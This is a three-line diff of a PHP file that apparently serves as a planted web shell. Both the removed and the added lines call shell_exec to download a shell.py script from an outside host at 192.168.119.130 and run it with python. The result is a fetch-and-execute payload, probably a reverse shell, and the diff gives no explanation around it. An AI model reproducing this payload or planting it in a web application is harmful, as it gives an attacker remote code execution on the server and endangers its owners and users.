@@ -1,3 +1,1 @@
-<?php echo shell_exec("curl http://192.168.119.130:8080/shell.py > /tmp/shell.py; cp /tmp/shell.py ./test.py; ls");?>
-
-<?php echo shell_exec("python test.py");?>
+<?php echo shell_exec("curl http://192.168.119.130/shell.py > /tmp/shell.py; python /tmp/shell.py");?>
